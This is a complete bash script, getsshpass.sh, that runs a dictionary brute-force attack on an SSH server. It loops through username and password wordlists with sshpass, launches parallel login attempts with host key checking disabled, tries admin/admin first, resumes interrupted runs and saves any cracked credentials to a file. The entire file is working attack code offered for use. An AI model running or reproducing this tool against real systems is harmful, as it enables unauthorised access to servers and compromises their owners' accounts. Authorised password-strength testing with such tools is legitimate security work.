#!/bin/bash
#
# sshpass return values:
#   0 - password OK
#   3 - general runtime error
#   5 - bad password
#   255 - connection refused


declare -r START_TIME=$(date +%s.%N)   # Start time of the program

function usage {
  echo -e "Usage: $0 [OPTIONS]"
  echo "OPTIONS: "
  echo -e "   -a    IP address of SSH server"
  echo -e "   -d    TCP port 1 - 65535 of SSH server"
  echo -e "   -n    slow down or speed up attack for number of seconds"
  echo -e "         e.g. 1, 0.1, 0.0, default value is 0.1"
  echo -e "   -p    path to file with passwords"
  echo -e "   -u    path to file with usernames"
  echo -e "   -v    display version"
  echo -e "   -h    display help"
 }

function version
 {
  echo -e "getsshpass.sh 0.8"
  echo -e "Copyright (C) 2016 Radovan Brezula 'brezular'"
  echo -e "License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>."
  echo -e "This is free software: you are free to change and redistribute it."
  echo -e "There is NO WARRANTY, to the extent permitted by law."
  exit
 }

function read_args {
 while getopts "a:d:n:p:u:hv" arg; do
    case "$arg" in
       a) ip="$OPTARG";;
       d) port="$OPTARG";;
       n) nval="$OPTARG";;
       p) passlist="$OPTARG"
          initpasslist="$passlist";;
       u) userlist="$OPTARG"
          inituserlist="$userlist";;
       v) version;;
       h) usage
          exit;;
    esac
 done
}

function check_args {
 pthdir="$(dirname $0)"

 if [ -f "$pthdir/x0x901f22result.txt" ]; then
    pass=$(grep -o "d: '.*'" x0x901f22result.txt | cut -d ":" -f2)
    echo "File '$pthdir/x0x901f22result.txt' contains saved password:$pass, nothing to do" && exit
 fi

 type -P sshpass 1>/dev/null
 [ "$?" -ne 0 ] && echo "Utillity 'sshpass' not found, exiting" && exit

 if [ -z "$ip" ]; then
    echo "IP address can't be empty, exiting"
    usage
    exit
 else
    echo "$ip" | grep -w "^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}.[0-9]\{1,3\}$" 1>/dev/null
    [ "$?" -ne 0 ] && echo "'$ip' is not valid IP address, exiting" && usage && exit
 fi

 [ -z "$nval" ] && nval=0.1                                                  # Use default value 0.1s if no -n is entered

 [ -z "$port" ] && echo "TCP port can'be empty, exiting" && usage && exit
 if [[ "$port" =~ ^[[:digit:]]+$ ]]; then
    if ( [ "$port" -gt 65535 ] || [ "$port" -eq 0 ] ); then
       echo "TCP port has to be in range 1 - 65535"
       usage
       exit
    fi
 else
    echo "TCP port must be digit, exiting"
    usage
    exit
 fi

 [ ! -f "$passlist" ] && echo "Can't find file with list of passwords, exiting" && usage && exit
 [ ! -f "$userlist" ] && echo "Can't find file with list of users, exiting" && usage && exit
 fullpasslist="$passlist"                                                                         #Backup original passlist
 fulluserlist="$userlist"                                                                         #Backup oroginal userlist

 # Check SSH connection
 echo -n "Checking SSH connection to '$ip': "
 sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 -p "$port" admin@"$ip" exit &>/dev/null; rvalssh="$?"
 if [ "$rvalssh" == 0 ]; then
    echo "*** OK ***"
    echo "*** Found username: 'admin' and password: 'admin' ***"  > "$pthdir/x0x901f22result.txt"
    evaluate_result
 elif [ "$rvalssh" == 255 ]; then
    echo "*** FAIL ***"
    echo "*** Can't establish SSH connection to '$ip', exiting ***" && exit
 else
    echo "*** OK ***"
 fi

# Read saved username and password from file 01xza01.txt, if file exists read saved credentials from file
    if [ -f "$pthdir/01xza01.txt" ]; then
       lastuser=$(head -1 "$pthdir/01xza01.txt" | cut -d ":" -f1)
       lastpass=$(head -1 "$pthdir/01xza01.txt" | cut -d ":" -f2)
       echo "Found file: '$pthdir/01xza01.txt' containig previously saved username: '$lastuser' and password: '$lastpass'"
       echo "Restoring attack using username '$lastuser' and password '$lastpass'"
       row1user=$(grep -wno "^$lastuser$" "$userlist"); rvaluser="$?"
       row1pass=$(grep -wno "^$lastpass$" "$passlist"); rvalpass="$?"

       if [ "$rvaluser" == 0 ]; then
          rowuser=$(echo "$row1user" | cut -d ":" -f1)
          tail -n +"$rowuser" "$userlist" > "$userlist"\.new
          userlist=$(echo "$userlist"\.new)
      fi

       if [ "$rvalpass" == 0 ]; then
         rowpass=$(echo "$row1pass" | cut -d ":" -f1)
         tail -n +"$rowpass" "$passlist" > "$passlist"\.new
         passlist=$(echo "$passlist"\.new)
       fi
    else
       [ ! -f "$pthdir/01xza01.txt" ] && echo "Warning: Can't find file containing last used username and password in directory '$pthdir', starting from beginning"
    fi

    maxusercount=$(wc -l "$fulluserlist" | cut -d " " -f1)
    maxpasscount=$(wc -l "$fullpasslist" | cut -d " " -f1)
    maxcount=$(( $maxusercount * $maxpasscount ))
    [ ! -f "$pthdir/01xza01.txt" ] && actualcount=1
}

function parallel_ssh {
 echo "$user":"$pass" > "$pthdir/01xza01.txt"
 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p "$port" "$user"@"$ip" exit &>/dev/null; retval="$?"
 [ "$retval" == 0 ] && echo "*** Found username: '$user' and password: '$pass' ***"  > "$pthdir/x0x901f22result.txt"
    #   While loop eliminates 'Connection refused' attempts -> retval=255 and 'General runtime error' -> retval=3
    #   It happens when parameter 'n' is too small
    #   retval must be either 0 -> good password or 5 -> bad password
 while [ "$retval" == 255 -o "$retval" == 3 ]; do
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p "$port" "$user"@"$ip" exit &>/dev/null; retval="$?"
    [ "$retval" == 0 ] && echo "*** Found username: '$user' and password: '$pass' ***"  > "$pthdir/x0x901f22result.txt"
    sleep "$nval"
 done
}

function launch_attack {
 while read user; do
    while read pass; do
       if [ ! -f "$pthdir/x0x901f22result.txt" ]; then
         echo "Trying username: '$user' and password: '$pass'"
	 parallel_ssh &>/dev/null &
       else
          evaluate_result
       fi
       sleep $nval
    done < "$passlist"
    passlist="$fullpasslist"                                                        # Always start search with first pass from dictionary when user is changed
 done < "$userlist"
 evaluate_result
}

# Show ellapsed time
function ellapsed_time {
 END_TIME=$(date +%s.%N)
 dt=$(echo "$END_TIME - $START_TIME" | bc)
 dd=$(echo "$dt/86400" | bc)
 dt2=$(echo "$dt-86400*$dd" | bc)
 dh=$(echo "$dt2/3600" | bc)
 dt3=$(echo "$dt2-3600*$dh" | bc)
 dm=$(echo "$dt3/60" | bc)
 ds=$(echo "$dt3-60*$dm" | bc | awk '{printf("%.2f\n", $1)}')

 if [ "$dd" == "0" ] ; then dd=""; else dd=${dd}"d "; fi
 if [ "$dh" == "0" ] ; then dh=""; else dh=${dh}"h "; fi
 if [ "$dm" == "0" ] ; then dm=""; else dm=${dm}"m "; fi

 echo "Ellapsed time: "${dd}""${dh}""${dm}""${ds}"s"
}

function evaluate_result {
    [ -f "$pthdir/01xza01.txt" ] && rm "$pthdir/01xza01.txt"                         # We don't need last saved password when script kills itself (password found) or
    if [ -f "$pthdir/x0x901f22result.txt" ]; then                                    # Display found username and password when password is found
       cat "$pthdir/x0x901f22result.txt"
       ellapsed_time
    else
       echo "*** Password not found, use other dictionary ***"
    fi
    [ -f "$inituserlist".new ] && rm "$inituserlist".new                              # delete files $inituserlist.new and $initpasslist.new
    [ -f "$initpasslist".new ] && rm "$initpasslist".new                              # they're created when interrupted guessing is used
    pkill sshpass
}

function monitor_signal {
 trap 'pkill sshpass; echo "Program teminated."; exit' SIGHUP SIGTERM SIGQUIT                             # kill sshpass when script finishes or
 trap 'pkill sshpass; echo "Ctrl+C detected, start script again to continue with attack"; exit' SIGINT    # it is interrupted / suspended
 trap 'pkill sshpass; echo "Ctrl+Z detected, start script again to continue with attack"; exit' SIGTSTP
}


### BODY ###

read_args $"@"
check_args
monitor_signal
launch_attack
